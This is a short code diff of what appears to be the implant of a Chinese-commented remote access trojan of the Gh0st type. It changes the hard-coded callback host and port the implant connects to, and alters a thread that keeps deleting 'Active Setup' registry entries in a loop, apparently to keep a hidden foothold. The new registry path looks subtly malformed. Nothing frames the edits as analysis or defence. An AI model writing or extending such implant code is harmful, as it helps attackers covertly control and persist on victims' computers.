@@ -41,7 +41,7 @@ LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
 
 DWORD WINAPI main(char *lpServiceName)
 {
-	//strcpy(g_strHost, "192.168.1.174");
+	strcpy(g_strHost, "192.168.0.118");
 	g_dwPort = 8088;
 	// lpServiceName,在ServiceMain返回后就没有了
 	char	strServiceName[256] = {0};
@@ -174,7 +174,7 @@ DWORD WINAPI main(char *lpServiceName)
 #ifdef _DLL
 	//////////////////////////////////////////////////////////////////////////
 	// Restor WindowStation and Desktop	
-	// 不需要恢复卓面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
+	// 不需要恢复桌面，因为如果是更新服务端的话，新服务端先运行，此进程恢复掉了卓面，会产生黑屏
 	// 	SetProcessWindowStation(hOldStation);
 	// 	CloseWindowStation(hWinSta);
 	//
@@ -336,7 +336,7 @@ DWORD WINAPI DelAXRegThread(LPVOID lpParam)
 	{
 		ZeroMemory(pstrTemp, strlen(pstrTemp));  //删除掉扩展名
 		//构造键值
-		sprintf(ActiveXStr, "%s%s", "Software\\Microsoft\\Active Setup\\Installed Components\\", strFileName);
+		sprintf(ActiveXStr, "%s%s", "Software\\Wow6432Node\\Active Setup\\Installed Components\\", strFileName);
 		while (1)
 		{
 			//不停的删除注册表
